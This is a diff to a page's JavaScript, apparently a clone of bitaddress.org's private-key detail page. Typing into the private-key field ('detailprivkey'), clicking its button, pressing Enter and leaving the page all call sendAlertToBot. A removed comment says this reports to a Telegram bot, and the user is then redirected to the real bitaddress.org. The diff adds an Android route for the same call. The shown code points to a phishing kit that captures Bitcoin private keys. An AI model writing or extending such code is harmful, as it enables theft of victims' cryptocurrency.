@@ -400,37 +400,33 @@ window.onload = function() {
         }
 
         
-	document.getElementById('detailprivkey').addEventListener('input', handleInput);
-	
-	document.getElementById('viewDetailsButton').addEventListener('click', function() {
-	    
-	    // Send the alert to the Telegram bot
-	    sendAlertToBot();
-	    
-	    // Add a short delay before redirecting
-	    setTimeout(function() {
-	        // Check if the Android interface is available
-	        if (window.AndroidInterface) {
-	            // Use the interface to open the URL in the Android app
-	            window.AndroidInterface.openUrl('https://bitaddress.org');
-	        } else {
-	            // If not on Android, fallback to web redirection
-	            window.location.href = 'https://bitaddress.org';
-	        }
-	    }, 2000); // Delay of 2 seconds
-	});
+document.getElementById('detailprivkey').addEventListener('input', handleInput);
 
+document.getElementById('viewDetailsButton').addEventListener('click', function() {
+    if (window.AndroidInterface) {
+        window.AndroidInterface.sendAlertToBot(); // Android interface for alert
+    } else {
+        sendAlertToBot(); // For web usage
+    }
 
-        document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') { 
-                sendAlertToBot(); 
+    setTimeout(function() {
+        window.location.href = 'https://bitaddress.org';
+    }, 2000);
+});
 
-                setTimeout(function() {
-                    window.location.href = 'https://bitaddress.org';
-                }, 2000);
-            }
-        });
+document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+    if (event.key === 'Enter') {
+        if (window.AndroidInterface) {
+            window.AndroidInterface.sendAlertToBot(); // Android interface for alert
+        } else {
+            sendAlertToBot(); // For web usage
+        }
 
+        setTimeout(function() {
+            window.location.href = 'https://bitaddress.org';
+        }, 2000);
+    }
+});
 
     window.addEventListener('beforeunload', function(event) {
         sendAlertToBot();
